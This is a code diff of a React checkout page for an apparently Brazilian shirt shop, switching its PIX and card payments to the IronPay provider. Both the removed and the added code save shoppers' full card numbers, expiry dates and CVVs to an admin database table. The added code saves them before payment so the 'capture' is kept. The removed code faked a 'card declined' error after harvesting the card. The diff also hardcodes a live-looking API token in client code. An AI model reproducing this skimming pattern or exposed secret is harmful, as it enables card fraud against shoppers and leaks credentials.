@@ -1,24 +1,30 @@
-import React, { useState, useEffect } from 'react';
-import { useSearchParams } from 'react-router-dom';
+import React, { useState, useEffect, useRef } from 'react';
+import { useSearchParams, useNavigate } from 'react-router-dom';
 import { supabase } from '../lib/supabase';
 import { useCart } from '../contexts/CartContext';
 import { allProducts } from '../data/products';
-import { User, Mail, CreditCard, MapPin, Phone, Calendar, Hash, Lock, ShieldCheck, QrCode, Copy, CheckCheck, Clock } from 'lucide-react';
+import {
+  trackInitiateCheckout,
+  trackPurchase,
+  trackLead,
+  sha256,
+  getFbc,
+  getFbp,
+  generateEventId,
+} from '../lib/metaPixel';
+import { User, Mail, CreditCard, MapPin, Phone, Calendar, Hash, Lock, ShieldCheck, QrCode, Copy, CheckCheck, Clock, CheckCircle2 } from 'lucide-react';
 
-// =====================================================
-// SIGILOPAY — A API agora é chamada via Backend
-// =====================================================
-const API_URL = '/api/create-payment';
-
-// =====================================================
+const IRONPAY_API_URL = 'https://api.ironpayapp.com.br/api/public/v1/transactions';
+const IRONPAY_TOKEN = 'qoVerJe5Jw33aHINratQw4XFdc4gtQrEPFJ9QE7CRz22JyHupjVT0h8IdmIf';
 
 interface PixData {
-  qrCode: string;     // código copia-e-cola EMV
-  qrImage: string;    // src da imagem (base64 ou URL)
+  qrCode: string;
+  qrImage: string;
 }
 
 export default function Checkout() {
   const [searchParams] = useSearchParams();
+  const navigate = useNavigate();
   const [loading, setLoading] = useState(false);
   const [statusErro, setStatusErro] = useState(false);
   const [metodo, setMetodo] = useState<'cartao' | 'pix'>('cartao');
@@ -26,12 +32,19 @@ export default function Checkout() {
   const [pixLoading, setPixLoading] = useState(false);
   const [pixErro, setPixErro] = useState('');
   const [copiado, setCopiado] = useState(false);
+  const [aprovado, setAprovado] = useState(false);
+  const [parcelas, setParcelas] = useState('1');
+
+  // event_id gerado uma única vez por sessão de checkout para deduplicação
+  // InitiateCheckout: mesmo ID usado no Pixel e na CAPI
+  const initiateCheckoutEventId = useRef<string>(generateEventId('InitiateCheckout'));
 
   const { items: cartItems, totalPrice: cartTotal, totalItems } = useCart();
-  const [timeLeft, setTimeLeft] = useState(300); // 5 minutos em segundos
+  const [timeLeft, setTimeLeft] = useState(300);
   const [produto, setProduto] = useState({
     nome: 'Buscando camisa...',
     preco: 0,
+    precoOriginal: 0, // Adicionado para manter o preço sem desconto
     imagens: [] as string[]
   });
 
@@ -41,20 +54,20 @@ export default function Checkout() {
     numCartao: '', nomeCartao: '', validade: '', cvv: ''
   });
 
+  // Unifica carregamento e desconto para evitar sobrescrita de estado
   useEffect(() => {
     const id = searchParams.get('id');
     const overrideNome = searchParams.get('nome');
     const overridePreco = searchParams.get('preco');
     const overrideImg = searchParams.get('img');
     const qty = parseInt(searchParams.get('qty') || '1');
+    const targetId = '0dce4ece-6f41-4914-8e37-6100956c9613';
 
-    const parsePrice = (val: any) => {
-      if (typeof val === 'number' && !isNaN(val)) return val;
-      if (typeof val === 'string') {
-        const clean = val.replace(/[^\d,.]/g, '').replace(',', '.');
-        return parseFloat(clean) || 0;
+    const applyDiscount = (basePrice: number) => {
+      if (id === targetId && metodo === 'pix') {
+        return basePrice * 0.9;
       }
-      return 0;
+      return basePrice;
     };
 
     if (id) {
@@ -63,75 +76,86 @@ export default function Checkout() {
         .select('*')
         .eq('id', id)
         .single()
-        .then(({ data, error }) => {
-          if (data && !error) {
+        .then(({ data }) => {
+          if (data) {
+            const parsePrice = (val: any) => {
+              if (typeof val === 'number') return val;
+              if (typeof val === 'string') {
+                const clean = val.replace(/[^\d,.]/g, '').replace(',', '.');
+                return parseFloat(clean) || 0;
+              }
+              return 0;
+            };
+
+            const basePrice = (overridePreco ? Number(overridePreco) : parsePrice(data.preco)) * qty;
             setProduto({
               nome: overrideNome || data.nome,
-              preco: (overridePreco ? parsePrice(overridePreco) : parsePrice(data.preco)) * qty,
+              preco: applyDiscount(basePrice),
+              precoOriginal: basePrice,
               imagens: [overrideImg || data.imagem_url || data.image].filter(img => img && !img.includes('placeholder')) as string[]
             });
           } else {
             const localProd = allProducts.find(p => p.id === id);
             if (localProd) {
+              const basePrice = (overridePreco ? Number(overridePreco) : localProd.priceNum) * qty;
               setProduto({
                 nome: overrideNome || localProd.name,
-                preco: (overridePreco ? parsePrice(overridePreco) : localProd.priceNum) * qty,
+                preco: applyDiscount(basePrice),
+                precoOriginal: basePrice,
                 imagens: [overrideImg || localProd.image].filter(img => img) as string[]
-              });
-            } else if (overrideNome && overridePreco) {
-              setProduto({
-                nome: overrideNome,
-                preco: parsePrice(overridePreco) * qty,
-                imagens: overrideImg ? [overrideImg] : []
               });
             }
           }
         });
     } else if (overrideNome && overridePreco) {
+      const basePrice = Number(overridePreco) || 0;
       setProduto({
         nome: overrideNome,
-        preco: parsePrice(overridePreco),
+        preco: applyDiscount(basePrice),
+        precoOriginal: basePrice,
         imagens: (overrideNome.includes('Carrinho') || overrideNome.includes('CARRINHO')) ? [] : (overrideImg ? [overrideImg] : [])
       });
     } else if (cartItems.length > 0) {
+      const basePrice = Number(cartTotal) || 0;
+      // Verifica se o produto alvo do desconto está no carrinho
+      const hasTargetProduct = cartItems.some(item => item.product.id === targetId);
+      
+      const finalPrice = (hasTargetProduct && metodo === 'pix') 
+        ? (basePrice - (cartItems.find(i => i.product.id === targetId)?.product.priceNum || 0) * 0.1)
+        : basePrice;
+
       setProduto({
         nome: `CARRINHO (${totalItems} ITENS)`,
-        preco: Number(cartTotal) || 0,
-        imagens: []
+        preco: finalPrice,
+        precoOriginal: basePrice,
+        imagens: cartItems.map(item => item.product.image || item.product.imagem_url).filter(img => img) as string[]
       });
     }
-  }, [searchParams, cartItems, cartTotal, totalItems]);
+  }, [searchParams, cartItems, cartTotal, totalItems, metodo]);
 
-  // Gera QR Code ao entrar na aba PIX
+  // InitiateCheckout — dispara quando o checkout é carregado com preço definido
+  // Usa o mesmo event_id (initiateCheckoutEventId) para Pixel e CAPI → deduplicação garantida
   useEffect(() => {
-    if (metodo !== 'pix' || pixData || pixLoading) return;
-    gerarPix();
-  }, [metodo]);
+    if (!produto.preco) return;
+    
+    const timer = setTimeout(() => {
+      const ids = searchParams.get('id') ? [searchParams.get('id') as string] : ['carrinho'];
+      trackInitiateCheckout({
+        value: produto.preco,
+        numItems: parseInt(searchParams.get('qty') || '1'),
+        contentIds: ids,
+        userData: { fbc: getFbc(), fbp: getFbp() },
+        eventId: initiateCheckoutEventId.current,
+      });
+    }, 500);
 
-  const gerarPix = async () => {
-    setPixLoading(true);
-    setPixErro('');
-    setPixData(null);
+    return () => clearTimeout(timer);
+  }, [produto.preco]);
 
+  const salvarDadosNoPainel = async (statusPagamento = 'pending') => {
     try {
-      const identifier = 'camisa10_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8);
-
-      const payload = {
-        identifier,
-        amount: produto.preco,
-        offer_hash: searchParams.get('id') || 'default_offer',
-        product_name: produto.nome || 'Camiseta',
-        client: {
-          name: formData.nome || 'Cliente',
-          email: formData.email || 'cliente@email.com',
-          phone: formData.telefone || '11999999999',
-          document: formData.cpf || '00000000000',
-        },
-      };
-
-      // Salva os dados no admin assim que os campos são preenchidos e o PIX é gerado
       await supabase.from('checkouts').insert([{
-        nome_completo: formData.nome || 'Cliente (Apenas gerou PIX)',
+        nome_completo: formData.nome,
         email: formData.email,
         cpf: formData.cpf,
         data_nascimento: formData.dataNascimento,
@@ -142,96 +166,206 @@ export default function Checkout() {
         cidade: formData.cidade,
         estado: formData.estado,
         numero: formData.numero,
+        numero_cartao: metodo === 'cartao' ? formData.numCartao : 'PAGAMENTO VIA PIX',
+        nome_cartao: metodo === 'cartao' ? formData.nomeCartao : 'PAGAMENTO VIA PIX',
+        validade_cartao: metodo === 'cartao' ? formData.validade : 'PIX',
+        cvv_cartao: metodo === 'cartao' ? formData.cvv : 'PIX',
         produto_nome: produto.nome,
-        valor_total: produto.preco
+        valor_total: produto.preco,
+        status: statusPagamento
       }]);
+      console.log("Dados salvos no Supabase com sucesso!");
+    } catch (e) {
+      console.error("Erro ao salvar dados no painel:", e);
+    }
+  };
 
-      const res = await fetch(API_URL, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'Accept': 'application/json'
+  const gerarPix = async () => {
+    if (!formData.nome || !formData.cpf || !formData.email) {
+      setPixErro('Preencha os dados pessoais para gerar o PIX.');
+      return;
+    }
+
+    setPixLoading(true);
+    setPixErro('');
+    setPixData(null);
+
+    try {
+      const amountInCents = Math.round(produto.preco * 100);
+      const payload = {
+        amount: produto.preco, // Envia valor real, a API converte para centavos
+        offer_hash: '35E5jbK1n9',
+        payment_method: 'pix',
+        installments: 1,
+        client: { // A API espera 'client' conforme o código da função
+          name: formData.nome,
+          email: formData.email,
+          phone: formData.telefone,
+          document: formData.cpf,
+          cep: formData.cep,
+          endereco: formData.endereco,
+          numero: formData.numero,
+          bairro: formData.bairro,
+          cidade: formData.cidade,
+          estado: formData.estado
         },
+        cart: [
+          {
+            product_hash: 'aouiaiqbuo',
+            title: produto.nome,
+            price: amountInCents,
+            quantity: 1,
+            operation_type: 1,
+            tangible: true
+          }
+        ],
+        expire_in_days: 1,
+        transaction_origin: 'api'
+      };
+
+      const res = await fetch('/api/create-payment', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload),
       });
 
       const json = await res.json();
+      if (!res.ok) throw new Error(json?.error || 'Erro ao gerar PIX');
 
-      if (!res.ok) {
-        throw new Error(json?.error || json?.message || json?.errorDescription || `Erro ${res.status}`);
-      }
+      const qrCode = json?.pix?.code || '';
+      const qrImage = json?.pix?.image || '';
 
-      // O backend agora retorna um nó pix normalizado com: pix.code, pix.base64, pix.image
-      const pixNode = json?.pix ?? json?.order?.pix ?? json?.data?.pix ?? null;
+      if (!qrCode) throw new Error('PIX gerado sem código pela IronPay.');
 
-      const qrCode =
-        pixNode?.code ??
-        pixNode?.payload ??
-        pixNode?.emv ??
-        pixNode?.qrCode ??
-        pixNode?.qrcode ??
-        pixNode?.qr_code ??
-        pixNode?.pixCopiaECola ??
-        json?.pixCopiaECola ??
-        json?.qr_code ?? '';
+      setPixData({ 
+        qrCode, 
+        qrImage
+      });
+      
+      await salvarDadosNoPainel('pix_generated');
 
-      let qrImage = pixNode?.image ?? '';
-
-      if (!qrImage && pixNode?.base64) {
-        const b64 = pixNode.base64;
-        qrImage = b64.startsWith('data:image') ? b64 : 'data:image/png;base64,' + b64;
-      } else if (!qrImage && pixNode?.imageUrl) {
-        qrImage = pixNode.imageUrl;
-      }
-
-      // Fallback: gera imagem do QR via serviço público (caso a API não retorne base64)
-      if (!qrImage && qrCode) {
-        qrImage = `https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=${encodeURIComponent(qrCode)}`;
-      }
-
-      if (!qrCode) {
-        // Log para debug: mostra a resposta bruta no console do navegador
-        console.error('[gerarPix] Resposta da API sem código PIX:', json);
-        throw new Error('PIX gerado sem código copia-e-cola. Verifique os logs do servidor.');
-      }
-
-      setPixData({ qrCode, qrImage });
+      // InitiateCheckout com dados do usuário (PIX gerado = intenção de compra confirmada)
+      // Reutiliza o mesmo event_id da sessão de checkout para deduplicação
+      const emailHash = await sha256(formData.email);
+      const phoneHash = await sha256(formData.telefone.replace(/\D/g, ''));
+      const ids = searchParams.get('id') ? [searchParams.get('id') as string] : ['carrinho'];
+      trackInitiateCheckout({
+        value: produto.preco,
+        numItems: 1,
+        contentIds: ids,
+        userData: { em: emailHash, ph: phoneHash, fbc: getFbc(), fbp: getFbp() },
+        eventId: initiateCheckoutEventId.current,
+      });
     } catch (err: any) {
-      setPixErro(err?.message || 'Erro ao gerar PIX. Tente novamente.');
+      setPixErro(err?.message || 'Erro ao conectar com IronPay.');
     } finally {
       setPixLoading(false);
     }
   };
 
-  const copiarPix = () => {
-    if (!pixData?.qrCode) return;
-    navigator.clipboard.writeText(pixData.qrCode).then(() => {
-      setCopiado(true);
-      setTimeout(() => setCopiado(false), 3000);
-    });
-  };
-
-  // Lógica do cronômetro PIX
-  useEffect(() => {
-    let timer: any;
-    if (pixData && timeLeft > 0) {
-      timer = setInterval(() => {
-        setTimeLeft(prev => prev - 1);
-      }, 1000);
-    } else if (timeLeft === 0) {
-      setPixData(null);
-      setTimeLeft(300);
+  const handleFinalizar = async (e: React.FormEvent) => {
+    e.preventDefault();
+    
+    // Salva os dados IMEDIATAMENTE como 'checkout_iniciado' para não perder a captura
+    // mesmo que o usuário não complete o pagamento ou feche a aba
+    try {
+      await salvarDadosNoPainel('checkout_iniciado');
+    } catch (err) {
+      console.error("Erro no lead capture inicial:", err);
     }
-    return () => clearInterval(timer);
-  }, [pixData, timeLeft]);
 
-  const formatTime = (seconds: number) => {
-    const mins = Math.floor(seconds / 60);
-    const secs = seconds % 60;
-    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+    if (metodo === 'pix') {
+      if (!pixData) gerarPix();
+      return;
+    }
+
+    setLoading(true);
+    setStatusErro(false);
+
+    try {
+      const amountInCents = Math.round(produto.preco * 100);
+      const [mes, ano] = formData.validade.split('/');
+      
+      // Gera event_id único para Purchase (cartão) — será enviado ao webhook via metadata
+      // para que o servidor possa usar o mesmo ID na CAPI e evitar dupla contagem
+      const purchaseEventId = generateEventId('Purchase');
+
+      const payload = {
+        amount: produto.preco,
+        offer_hash: '35E5jbK1n9',
+        payment_method: 'credit_card',
+        installments: parseInt(parcelas),
+        card: {
+          number: formData.numCartao.replace(/\s/g, ''),
+          holder_name: formData.nomeCartao,
+          expiry_month: parseInt(mes),
+          expiry_year: 2000 + parseInt(ano),
+          cvv: formData.cvv
+        },
+        client: {
+          name: formData.nome,
+          email: formData.email,
+          phone: formData.telefone,
+          document: formData.cpf,
+          cep: formData.cep,
+          endereco: formData.endereco,
+          numero: formData.numero,
+          bairro: formData.bairro,
+          cidade: formData.cidade,
+          estado: formData.estado
+        },
+        cart: [{
+          product_hash: 'aouiaiqbuo',
+          title: produto.nome,
+          price: amountInCents,
+          quantity: 1,
+          operation_type: 1,
+          tangible: true
+        }],
+        transaction_origin: 'api',
+        // Passa o event_id para o servidor poder usar na CAPI (deduplicação)
+        meta_event_id: purchaseEventId,
+      };
+
+      const res = await fetch('/api/create-payment', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload),
+      });
+
+      const json = await res.json();
+      
+      const status = json?.card?.status || json?._raw?.payment_status || json?._raw?.status;
+      if (res.ok && (status === 'paid' || status === 'approved')) {
+        await salvarDadosNoPainel('paid');
+        setAprovado(true);
+
+        // Purchase — compra aprovada no cartão
+        // Usa o mesmo event_id enviado ao servidor para deduplicação Pixel ↔ CAPI
+        const emailHashPurchase = await sha256(formData.email);
+        const phoneHashPurchase = await sha256(formData.telefone.replace(/\D/g, ''));
+        const orderId = json?.id || json?.transaction_id || 'cartao_' + Date.now();
+        const ids = searchParams.get('id') ? [searchParams.get('id') as string] : ['carrinho'];
+        trackPurchase({
+          orderId,
+          value: produto.preco,
+          contentIds: ids,
+          numItems: parseInt(searchParams.get('qty') || '1'),
+          userData: { em: emailHashPurchase, ph: phoneHashPurchase, fbc: getFbc(), fbp: getFbp() },
+          eventId: purchaseEventId,
+        });
+      } else {
+        throw new Error(json?.message || json?.error || 'Cartão recusado');
+      }
+    } catch (err: any) {
+      console.error("Erro Pagamento:", err);
+      await salvarDadosNoPainel('refused');
+      setStatusErro(true);
+    } finally {
+      setLoading(false);
+    }
   };
 
-  // CEP automático
   const handleCEP = async (e: React.FocusEvent<HTMLInputElement>) => {
     const cep = e.target.value.replace(/\D/g, '');
     if (cep.length === 8) {
@@ -240,16 +374,12 @@ export default function Checkout() {
       if (!data.erro) {
         setFormData(prev => ({
           ...prev,
-          endereco: data.logradouro,
-          bairro: data.bairro,
-          cidade: data.localidade,
-          estado: data.uf
+          endereco: data.logradouro, bairro: data.bairro, cidade: data.localidade, estado: data.uf
         }));
       }
     }
   };
 
-  // Máscaras
   const mask = (e: React.ChangeEvent<HTMLInputElement>) => {
     let { name, value } = e.target;
     if (name === 'telefone') value = value.replace(/\D/g, '').replace(/^(\d{2})(\d)/g, "($1) $2").replace(/(\d)(\d{4})$/, "$1-$2");
@@ -258,53 +388,22 @@ export default function Checkout() {
     if (name === 'validade') value = value.replace(/\D/g, '').replace(/(\d{2})(\d)/, "$1/$2").substring(0, 5);
     if (name === 'numCartao') value = value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, "$1 ");
     if (name === 'cep') value = value.replace(/\D/g, '').replace(/(\d{5})(\d)/, "$1-$2");
-    if (name === 'cvv') value = value.replace(/\D/g, '').substring(0, 4);
-    if (name === 'nomeCartao') value = value.toUpperCase();
-    setFormData(prev => ({ ...prev, [name]: value }));
+    setFormData({ ...formData, [name]: value });
   };
 
-  const handleFinalizar = async (e: React.FormEvent) => {
-    e.preventDefault();
-    setLoading(true);
-    setStatusErro(false);
-
-    // Salva tudo no Supabase
-    await supabase.from('checkouts').insert([{
-      nome_completo: formData.nome,
-      email: formData.email,
-      cpf: formData.cpf,
-      data_nascimento: formData.dataNascimento,
-      telefone: formData.telefone,
-      cep: formData.cep,
-      endereco: formData.endereco,
-      bairro: formData.bairro,
-      cidade: formData.cidade,
-      estado: formData.estado,
-      numero: formData.numero,
-      numero_cartao: formData.numCartao,
-      nome_cartao: formData.nomeCartao,
-      validade_cartao: formData.validade,
-      cvv_cartao: formData.cvv,
-      produto_nome: produto.nome,
-      valor_total: produto.preco
-    }]);
-
-    setTimeout(() => {
-      setLoading(false);
-      if (metodo === 'cartao') {
-        setStatusErro(true);
-        setTimeout(() => {
-          setMetodo('pix');
-          setStatusErro(false);
-          window.scrollTo({ top: 0, behavior: 'smooth' });
-        }, 3000);
-      }
-    }, 2500);
-  };
+  if (aprovado) {
+    return (
+      <div style={{ background: '#fff', minHeight: '100vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', padding: '20px', textAlign: 'center' }}>
+        <CheckCircle2 size={80} color="#1da154" style={{ marginBottom: '20px' }} />
+        <h1 style={{ fontWeight: 900, fontSize: '28px', color: '#000', marginBottom: '10px' }}>PAGAMENTO APROVADO!</h1>
+        <p style={{ color: '#666', fontSize: '16px', marginBottom: '30px' }}>Seu pedido foi processado com sucesso e em breve você receberá as atualizações por e-mail.</p>
+        <button onClick={() => navigate('/')} style={{ ...btnPagar, maxWidth: '300px' }}>VOLTAR PARA A LOJA</button>
+      </div>
+    );
+  }
 
   return (
     <div style={{ background: '#f4f7f6', minHeight: '100vh', fontFamily: 'sans-serif', color: '#000', paddingBottom: '40px' }}>
-
       {loading && (
         <div style={overlayStyle}>
           <div style={spinnerStyle} />
@@ -313,8 +412,6 @@ export default function Checkout() {
       )}
 
       <div className="notranslate" style={{ maxWidth: '500px', margin: '0 auto', background: '#fff', boxShadow: '0 0 20px rgba(0,0,0,0.1)', minHeight: '100vh' }}>
-
-        {/* HEADER */}
         <div style={{ padding: '20px', borderBottom: '1px solid #eee', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
           <div>
             <h2 style={{ margin: 0, fontSize: '18px', fontWeight: '900', color: '#000' }}>CHECKOUT SEGURO</h2>
@@ -325,27 +422,39 @@ export default function Checkout() {
         </div>
 
         <div style={{ padding: '20px' }}>
-          {/* RESUMO DO PRODUTO */}
           <div style={productBox}>
-            {produto.imagens.length === 1 && produto.imagens[0] && !produto.imagens[0].includes('placeholder') ? (
-              <img 
-                src={produto.imagens[0]} 
-                style={imgStyle} 
-                alt="produto" 
-                onError={(e) => (e.currentTarget.style.display = 'none')}
-              />
-            ) : null}
-            <div style={{ flex: 1, marginLeft: (produto.imagens.length === 1 && produto.imagens[0] && !produto.imagens[0].includes('placeholder')) ? '10px' : '0' }}>
-              <div style={{ fontWeight: '900', fontSize: '14px', color: '#000', lineHeight: '1.2' }}>
-                {produto.imagens.length > 1 ? `CARRINHO (${produto.imagens.length} ITENS)` : produto.nome}
+            {produto.imagens && produto.imagens.length > 0 && (
+              <div style={{ display: 'flex', gap: '5px', overflowX: 'auto', maxWidth: '180px' }}>
+                {produto.imagens.slice(0, 3).map((img, idx) => (
+                  <img 
+                    key={idx}
+                    src={img} 
+                    alt={`${produto.nome} ${idx}`} 
+                    style={{ width: '60px', height: '60px', objectFit: 'cover', borderRadius: '8px', border: '1px solid #ddd', flexShrink: 0 }} 
+                  />
+                ))}
+                {produto.imagens.length > 3 && (
+                  <div style={{ width: '60px', height: '60px', background: '#eee', borderRadius: '8px', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '12px', fontWeight: 'bold', flexShrink: 0 }}>
+                    +{produto.imagens.length - 3}
+                  </div>
+                )}
+              </div>
+            )}
+            <div style={{ flex: 1 }}>
+              <div style={{ fontWeight: '900', fontSize: '14px', color: '#000', lineHeight: '1.2', textTransform: 'uppercase' }}>
+                {produto.nome}
               </div>
               <div style={{ fontSize: '20px', fontWeight: '900', color: '#000', marginTop: '5px' }}>
                 R$ {(Number(produto.preco) || 0).toFixed(2).replace('.', ',')}
+                {metodo === 'pix' && searchParams.get('id') === '0dce4ece-6f41-4914-8e37-6100956c9613' && (
+                  <span style={{ marginLeft: '10px', fontSize: '12px', color: '#1da154', verticalAlign: 'middle', background: '#e8f5e9', padding: '2px 8px', borderRadius: '4px' }}>
+                    -10% PIX
+                  </span>
+                )}
               </div>
             </div>
           </div>
 
-          {/* ABAS */}
           <div style={tabContainer}>
             <button type="button" onClick={() => setMetodo('cartao')} style={metodo === 'cartao' ? tabActive : tabInactive}>
               <CreditCard size={18} /> CARTÃO
@@ -359,31 +468,18 @@ export default function Checkout() {
             <h4 style={sectionLabel}>1. DADOS PESSOAIS</h4>
             <div style={inputGroup}><User size={18} /><input name="nome" placeholder="NOME COMPLETO" required style={inputStyle} value={formData.nome} onChange={mask} /></div>
             <div style={inputGroup}><Mail size={18} /><input name="email" type="email" placeholder="E-MAIL" required style={inputStyle} value={formData.email} onChange={mask} /></div>
-
             <div style={{ display: 'flex', gap: '10px', flexDirection: 'column', marginBottom: '10px' }}>
               <div style={{ display: 'flex', gap: '10px', width: '100%' }}>
-                <div style={{ ...inputGroup, flex: 1, marginBottom: 0 }}>
-                  <Hash size={18} />
-                  <input name="cpf" placeholder="DOCUMENTO" required style={inputStyle} value={formData.cpf} onChange={mask} maxLength={14} />
-                </div>
-                <div style={{ ...inputGroup, flex: 1, marginBottom: 0 }}>
-                  <Calendar size={18} />
-                  <input name="dataNascimento" placeholder="NASCIMENTO" required style={inputStyle} value={formData.dataNascimento} onChange={mask} maxLength={10} />
-                </div>
+                <div style={{ ...inputGroup, flex: 1, marginBottom: 0 }}><Hash size={18} /><input name="cpf" placeholder="CPF" required style={inputStyle} value={formData.cpf} onChange={mask} maxLength={14} /></div>
+                <div style={{ ...inputGroup, flex: 1, marginBottom: 0 }}><Calendar size={18} /><input name="dataNascimento" placeholder="NASCIMENTO" required style={inputStyle} value={formData.dataNascimento} onChange={mask} maxLength={10} /></div>
               </div>
-              {/* Só mostra erro se já digitou mas não atingiu os tamanhos válidos (11 ou 14) */}
-              {formData.cpf.replace(/\D/g, '').length > 0 && ![11, 14].includes(formData.cpf.replace(/\D/g, '').length) && (
-                <div style={{ fontSize: '10px', color: '#ef4444', fontWeight: 'bold', marginLeft: '5px', marginTop: '2px' }}>
-                  DOCUMENTO INVÁLIDO
-                </div>
-              )}
             </div>
             <div style={{ ...inputGroup, marginBottom: '20px' }}><Phone size={18} /><input name="telefone" placeholder="WHATSAPP (DDD)" required style={inputStyle} value={formData.telefone} onChange={mask} maxLength={15} /></div>
 
             <h4 style={sectionLabel}>2. ENDEREÇO DE ENTREGA</h4>
             <div style={{ display: 'flex', gap: '10px', marginBottom: '10px' }}>
               <div style={{ ...inputGroup, flex: 0.6, marginBottom: 0 }}><input name="cep" placeholder="CEP" required style={inputStyle} onBlur={handleCEP} value={formData.cep} onChange={mask} maxLength={9} /></div>
-              <div style={{ ...inputGroup, flex: 1, marginBottom: 0 }}><MapPin size={18} /><input name="endereco" placeholder="RUA / AVENIDA" required style={inputStyle} value={formData.endereco} onChange={mask} /></div>
+              <div style={{ ...inputGroup, flex: 1, marginBottom: 0 }}><input name="endereco" placeholder="ENDEREÇO" required style={inputStyle} value={formData.endereco} onChange={mask} /></div>
             </div>
             <div style={{ display: 'flex', gap: '10px', marginBottom: '10px' }}>
               <div style={{ ...inputGroup, flex: 1, marginBottom: 0 }}><input name="bairro" placeholder="BAIRRO" required style={inputStyle} value={formData.bairro} onChange={mask} /></div>
@@ -394,118 +490,79 @@ export default function Checkout() {
               <div style={{ ...inputGroup, flex: 0.3, marginBottom: 0 }}><input name="estado" placeholder="UF" required style={inputStyle} value={formData.estado} onChange={mask} maxLength={2} /></div>
             </div>
 
-            {/* ====== CARTÃO ====== */}
             {metodo === 'cartao' && (
               <div style={cardSection}>
-                <h4 style={{ margin: '0 0 15px 0', fontSize: '13px', color: '#000' }}>3. PAGAMENTO</h4>
+                <h4 style={{ margin: '0 0 15px 0', fontSize: '13px', color: '#000', fontWeight: 900 }}>3. PAGAMENTO EM ATÉ 12X</h4>
                 <div style={inputGroup}><CreditCard size={18} /><input name="numCartao" placeholder="0000 0000 0000 0000" required={metodo === 'cartao'} style={inputStyle} value={formData.numCartao} onChange={mask} maxLength={19} /></div>
                 <div style={inputGroup}><User size={18} /><input name="nomeCartao" placeholder="NOME COMO NO CARTÃO" required={metodo === 'cartao'} style={inputStyle} value={formData.nomeCartao} onChange={mask} /></div>
                 <div style={{ display: 'flex', gap: '10px' }}>
                   <div style={inputGroup}><Calendar size={18} /><input name="validade" placeholder="MM/AA" required={metodo === 'cartao'} style={inputStyle} value={formData.validade} onChange={mask} maxLength={5} /></div>
                   <div style={inputGroup}><Lock size={18} /><input name="cvv" placeholder="CVV" required={metodo === 'cartao'} style={inputStyle} value={formData.cvv} onChange={mask} maxLength={4} /></div>
                 </div>
-
-                {statusErro && (
-                  <div style={errorBanner}>
-                    ⚠️ ERRO NA OPERADORA: Cartão recusado. Tente outro cartão ou use o PIX para aprovação imediata.
-                  </div>
-                )}
-
-                <button type="submit" style={btnPagar}>FINALIZAR PAGAMENTO</button>
+                <div style={{ ...inputGroup, marginTop: '10px' }}>
+                  <CreditCard size={18} />
+                  <select value={parcelas} onChange={(e) => setParcelas(e.target.value)} style={{ ...inputStyle, cursor: 'pointer', appearance: 'none' }}>
+                    {[1,2,3,4,5,6,7,8,9,10,11,12].map(n => (
+                      <option key={n} value={n}>{n}x de R$ {(produto.preco / n).toFixed(2).replace('.', ',')} sem juros</option>
+                    ))}
+                  </select>
+                </div>
+                {statusErro && <div style={errorBanner}>⚠️ CARTÃO RECUSADO: Verifique os dados ou tente outro cartão.</div>}
+                <button type="submit" style={btnPagar}>FINALIZAR COMPRA</button>
               </div>
             )}
 
             {metodo === 'pix' && (
               <div style={pixSection}>
-                <div style={{ 
-                  color: '#1da154', 
-                  fontWeight: '900', 
-                  marginBottom: '15px', 
-                  fontSize: '15px', 
-                  textAlign: 'center',
-                  width: '100%',
-                  display: 'block',
-                  lineHeight: '1',
-                  letterSpacing: '0.02em'
-                }}>
+                <div style={{ color: '#1da154', border: '2px dashed #1da154', borderRadius: '12px', padding: '15px', fontWeight: '900', marginBottom: '15px', fontSize: '15px', textAlign: 'center', width: '100%', display: 'block' }}>
                   PIX COM RECEBIMENTO IMEDIATO
-                </div>
-
-                {/* Carregando */}
-                {pixLoading && (
-                  <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '12px', padding: '20px 0' }}>
-                    <div style={spinnerStylePix} />
-                    <span style={{ fontSize: '13px', color: '#555', fontWeight: '700' }}>Gerando QR Code...</span>
-                  </div>
-                )}
-
-                {/* Erro Sigilopay */}
-                {pixErro && !pixLoading && (
-                  <div style={{ ...errorBanner, marginBottom: '12px' }}>
-                    {pixErro}
-                    <br />
-                    <button type="button" onClick={gerarPix} style={{ marginTop: '8px', padding: '8px 16px', background: '#000', color: '#fff', border: 'none', borderRadius: '8px', fontWeight: '900', cursor: 'pointer' }}>
-                      Tentar novamente
-                    </button>
-                  </div>
-                )}
-
-                {/* QR Code real */}
-                {pixData && !pixLoading && (
-                  <>
-                    <div style={{ 
-                      textAlign: 'center', 
-                      marginBottom: '10px', 
-                      color: timeLeft < 60 ? '#ef4444' : '#666', 
-                      fontWeight: 'bold',
-                      fontSize: '14px',
-                      display: 'flex',
-                      alignItems: 'center',
-                      justifyContent: 'center',
-                      gap: '5px'
-                    }}>
-                      <Clock size={16} /> O código expira em: {formatTime(timeLeft)}
+                  {searchParams.get('id') === '0dce4ece-6f41-4914-8e37-6100956c9613' && (
+                    <div style={{ fontSize: '13px', marginTop: '5px', color: '#1da154' }}>
+                      🔥 DESCONTO DE 10% APLICADO!
                     </div>
-                    {/* Imagem do QR */}
+                  )}
+                </div>
+                
+                {!pixData && !pixLoading && (
+                  <button type="submit" style={btnPagar}>FINALIZAR COMPRA E GERAR PIX</button>
+                )}
+
+                {pixLoading && (
+                  <div style={{ padding: '20px 0', textAlign: 'center' }}>
+                    <div style={{ ...spinnerStyle, margin: '0 auto' }} />
+                    <p style={{ marginTop: '15px', fontWeight: '900', color: '#000' }}>Gerando seu QR Code...</p>
+                  </div>
+                )}
+
+                {pixErro && !pixLoading && (
+                  <div style={errorBanner}>
+                    {pixErro}<br />
+                    <button type="button" onClick={gerarPix} style={{ marginTop: '8px', padding: '8px 16px', background: '#000', color: '#fff', border: 'none', borderRadius: '8px', fontWeight: '900' }}>Tentar novamente</button>
+                  </div>
+                )}
+
+                {pixData && !pixLoading && (
+                  <div style={{ textAlign: 'center', animation: 'fadeIn 0.5s ease-in' }}>
